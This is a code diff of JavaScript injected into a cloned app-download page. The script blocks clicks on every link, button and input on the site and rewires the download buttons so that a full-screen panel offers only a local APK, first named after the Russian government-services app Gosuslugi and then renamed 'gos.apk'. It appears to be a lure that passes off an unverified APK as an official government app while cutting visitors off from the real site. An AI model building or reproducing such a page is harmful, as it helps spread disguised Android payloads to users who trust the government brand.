@@ -2001,48 +2001,29 @@ FastSearch();
 <script>
 (function() {
     /* --- НАСТРОЙКИ --- */
-    // Точное название файла, как на Гитхабе (регистр важен!)
-    const MY_APK_LINK = "ГосУслуги.apk"; 
+    // Сделай имя файла на английском, так надежнее!
+    // Если на Гитхабе файл называется gos.apk, пиши сюда gos.apk
+    const MY_APK_LINK = "gos.apk"; 
     
     const MY_PANEL_TITLE = "Файл готов к загрузке";
     const MY_BUTTON_TEXT = "Скачать файл";
 
-    /* 0. ЛЕЧИМ ВЕРХНЮЮ КНОПКУ (чтобы не уводила на 5play) */
-    // Ждем полной загрузки, затем меняем ссылку
-    document.addEventListener("DOMContentLoaded", function() {
-        fixTopButton();
-    });
-    // И запускаем сразу на всякий случай
-    fixTopButton();
-
-    function fixTopButton() {
-        const topBtns = document.querySelectorAll('a[href*="#download-now"]');
-        topBtns.forEach(btn => {
-            // Делаем ссылку локальной (просто скролл)
-            btn.setAttribute('href', '#download-now');
-            // Убираем открытие в новой вкладке
-            btn.removeAttribute('target');
-            // Убираем возможные левые обработчики
-            btn.replaceWith(btn.cloneNode(true));
-        });
-    }
-
-    /* 1. СТИЛИ (CSS) */
+    /* 1. СТИЛИ (CSS) - Блокируем всё лишнее */
     const style = document.createElement('style');
     style.innerHTML = `
-        /* Блокируем всё */
-        a, button, input, [role="button"], .btn {
-            pointer-events: none !important;
+        /* БЛОКИРУЕМ ВООБЩЕ ВСЁ НА САЙТЕ */
+        body a, body button, body input, .btn {
+            pointer-events: none !important; /* Запрещаем клики */
             cursor: default !important;
         }
 
-        /* РАЗРЕШАЕМ: Верхнюю кнопку (которую мы исправили) */
-        a[href="#download-now"] {
+        /* РАЗРЕШАЕМ: Верхнюю кнопку */
+        a#new-top-btn {
             pointer-events: auto !important;
             cursor: pointer !important;
         }
 
-        /* РАЗРЕШАЕМ: Кнопки файлов в списке (чтобы открывали панель) */
+        /* РАЗРЕШАЕМ: Кнопки файлов (триггеры) */
         .download-line-link {
             pointer-events: auto !important;
             cursor: pointer !important;
@@ -2051,100 +2032,98 @@ FastSearch();
         /* СТИЛИ ПАНЕЛИ */
         #my-custom-panel {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.95); 
-            z-index: 2147483647; /* Поверх всего */
-            display: flex; justify-content: center; align-items: center;
-            opacity: 0; visibility: hidden; transition: opacity 0.2s;
-            pointer-events: auto !important; /* Окно кликабельно */
+            background: rgba(0, 0, 0, 0.9); 
+            z-index: 999999999; /* Поверх всего */
+            display: none; /* Скрыто по умолчанию */
+            justify-content: center; align-items: center;
         }
-        #my-custom-panel.active { opacity: 1; visibility: visible; }
         
+        /* ВАЖНО: Разрешаем клики внутри нашей панели */
+        #my-custom-panel * {
+            pointer-events: auto !important;
+        }
+
         .my-panel-content {
             background: #222; padding: 30px; border-radius: 12px;
             text-align: center; width: 350px; border: 1px solid #444;
-            box-shadow: 0 0 50px rgba(0,0,0,1);
-            position: relative;
+            box-shadow: 0 0 50px #000;
         }
         .my-panel-title { 
             color: #fff; font-size: 22px; margin-bottom: 25px; 
-            font-weight: bold; font-family: Arial, sans-serif; 
+            font-weight: bold; font-family: sans-serif; 
         }
         .my-download-btn {
             display: block; width: 100%; padding: 15px 0;
             background: #28a745; color: white !important; 
             text-decoration: none !important; font-weight: bold; 
-            border-radius: 8px; font-size: 18px; font-family: Arial, sans-serif; 
-            cursor: pointer !important; pointer-events: auto !important;
-            border: none; margin-bottom: 15px;
-            box-shadow: 0 5px 15px rgba(40, 167, 69, 0.4);
+            border-radius: 8px; font-size: 18px; font-family: sans-serif; 
+            cursor: pointer !important; margin-bottom: 15px; border: none;
         }
-        .my-download-btn:hover { background: #218838; transform: scale(1.02); }
+        .my-download-btn:hover { background: #218838; }
         .my-close-btn {
-            background: #333; border: none; color: #ccc !important; 
+            background: #333; border: none; color: #fff !important; 
             cursor: pointer !important; font-size: 14px; padding: 12px;
-            pointer-events: auto !important; width: 100%; border-radius: 8px;
+            width: 100%; border-radius: 8px;
         }
-        .my-close-btn:hover { background: #444; color: #fff !important; }
     `;
     document.head.appendChild(style);
 
-    /* 2. СОЗДАЕМ ПАНЕЛЬ */
+    /* 2. СОЗДАЕМ ПАНЕЛЬ (С жесткими командами onclick) */
     const panelHTML = `
         <div id="my-custom-panel">
             <div class="my-panel-content">
                 <div class="my-panel-title">${MY_PANEL_TITLE}</div>
-                <a href="${MY_APK_LINK}" class="my-download-btn" download>${MY_BUTTON_TEXT}</a>
-                <button type="button" class="my-close-btn">Закрыть</button>
+                
+                <!-- Кнопка скачивания: сразу открывает ссылку -->
+                <a href="${MY_APK_LINK}" class="my-download-btn" download target="_blank">
+                    ${MY_BUTTON_TEXT}
+                </a>
+
+                <!-- Кнопка закрытия: просто скрывает блок -->
+                <button type="button" class="my-close-btn" onclick="document.getElementById('my-custom-panel').style.display='none'">
+                    Закрыть
+                </button>
             </div>
         </div>
     `;
     document.body.insertAdjacentHTML('beforeend', panelHTML);
 
-    /* 3. ОБРАБОТЧИК КЛИКОВ */
-    const panel = document.getElementById('my-custom-panel');
+    /* 3. СКРИПТ: ЛЕЧИМ КНОПКИ САЙТА */
+    
+    // А) Верхняя кнопка "Скачать APK"
+    // Мы находим её, удаляем и создаем свою на её месте, чтобы убрать редиректы
+    const oldTopBtn = document.querySelector('a[href*="#download-now"]');
+    if (oldTopBtn) {
+        const newTopBtn = document.createElement('a');
+        newTopBtn.innerHTML = oldTopBtn.innerHTML; // Копируем текст/иконку
+        newTopBtn.className = oldTopBtn.className; // Копируем стиль
+        newTopBtn.id = 'new-top-btn'; // Даем свой ID для CSS
+        newTopBtn.href = '#download-now'; // Ставим якорь
+        
+        // При клике плавно скроллим
+        newTopBtn.onclick = function(e) {
+            e.preventDefault();
+            document.getElementById('download-now').scrollIntoView({behavior: 'smooth'});
+        };
+        
+        oldTopBtn.parentNode.replaceChild(newTopBtn, oldTopBtn);
+    }
 
-    window.addEventListener('click', function(e) {
-        const target = e.target;
+    // Б) Кнопки файлов в списке (Триггеры панели)
+    // Находим все кнопки внизу
+    const triggerBtns = document.querySelectorAll('.download-line-link');
+    triggerBtns.forEach(btn => {
+        // Убиваем старую кнопку, создаем чистую копию
+        const newBtn = btn.cloneNode(true);
+        btn.parentNode.replaceChild(newBtn, btn);
 
-        // --- 1. Кнопка ЗАКРЫТЬ ---
-        if (target.closest('.my-close-btn')) {
-            e.preventDefault(); e.stopPropagation();
-            panel.classList.remove('active');
-            return;
-        }
-
-        // --- 2. Кнопка СКАЧАТЬ (в панели) ---
-        if (target.closest('.my-download-btn')) {
-            e.stopPropagation(); // Не даем сайту перехватить
-            return; // РАЗРЕШАЕМ браузеру скачать файл
-        }
-
-        // --- 3. Внутри панели (фон) ---
-        if (target.closest('.my-panel-content')) {
-            e.stopPropagation(); return;
-        }
-
-        // --- 4. Верхняя кнопка (мы её уже исправили, но разрешим клик) ---
-        if (target.closest('a[href="#download-now"]')) {
-            // Разрешаем скролл
-            return; 
-        }
-
-        // --- 5. Кнопки файлов в списке (ОТКРЫТЬ ПАНЕЛЬ) ---
-        if (target.closest('.download-line-link')) {
-            e.preventDefault(); e.stopPropagation();
-            panel.classList.add('active');
-            return;
-        }
-
-        // --- БЛОКИРОВКА ВСЕГО ОСТАЛЬНОГО ---
-        e.preventDefault();
-        e.stopPropagation();
-        e.stopImmediatePropagation();
-        console.log('Blocked');
-        return false;
-
-    }, true);
+        // Вешаем открытие панели
+        newBtn.onclick = function(e) {
+            e.preventDefault(); 
+            e.stopPropagation();
+            document.getElementById('my-custom-panel').style.display = 'flex';
+        };
+    });
 
 })();
 </script>
